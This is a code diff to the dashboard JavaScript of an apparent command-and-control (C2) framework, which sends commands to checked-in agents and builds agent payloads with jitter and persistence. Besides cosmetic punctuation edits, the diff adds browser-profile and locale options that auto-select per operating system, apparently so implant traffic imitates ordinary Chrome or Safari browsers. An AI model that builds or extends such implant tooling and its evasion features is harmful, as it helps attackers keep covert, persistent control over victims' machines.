@@ -1,5 +1,5 @@
 /**
- * C2 Project — Dashboard JavaScript v2.0
+ * C2 Project - Dashboard JavaScript v2.0
  * Handles section switching, agent control, payload building, and AJAX refresh.
  */
 
@@ -114,7 +114,7 @@ function sendCommand() {
             <span class="cmd-prompt">❯ </span>
             <span class="cmd-text">${escapeHtml(command)}</span>
         </div>
-        <div class="cmd-status pending">⏳ Pending — waiting for agent check-in…</div>
+        <div class="cmd-status pending">⏳ Pending - waiting for agent check-in…</div>
     `);
 
     commandInput.value = "";
@@ -294,6 +294,8 @@ function buildAgent(event) {
         jitter_min: jitterMin,
         jitter_max: jitterMax,
         persistence: document.getElementById("build-persist").checked,
+        profile_id: parseInt(document.getElementById("build-profile").value, 10),
+        locale: document.getElementById("build-locale").value.trim() || "en-US,en;q=0.9",
     };
 
     // Validate
@@ -333,7 +335,7 @@ function buildAgent(event) {
                 return;
             }
 
-            // Success — trigger download
+            // Success -> trigger download
             progressText.textContent = `✓ Built successfully! (${formatFileSize(data.file_size)})`;
             progressText.style.color = "#00e676";
 
@@ -522,7 +524,7 @@ function formatFileSize(bytes) {
 }
 
 function formatTimestamp(ts) {
-    if (!ts) return "—";
+    if (!ts) return "-";
     try {
         const d = new Date(ts);
         const now = new Date();
@@ -729,6 +731,19 @@ function deleteStagedFile(fileId) {
 if (persistCheckbox) {
     persistCheckbox.addEventListener("change", () => {
         persistLabel.textContent = persistCheckbox.checked ? "Enabled" : "Disabled";
+    });
+}
+
+// ─── Auto-select browser profile when OS changes ───
+const buildOsSelect = document.getElementById("build-os");
+const buildProfileSelect = document.getElementById("build-profile");
+
+if (buildOsSelect && buildProfileSelect) {
+    buildOsSelect.addEventListener("change", () => {
+        const os = buildOsSelect.value;
+        // Default profile per OS: Chrome/Windows=1, Chrome/Linux=2, Safari/macOS=5
+        const defaults = { windows: "1", linux: "2", mac: "5" };
+        buildProfileSelect.value = defaults[os] || "1";
     });
 }
 
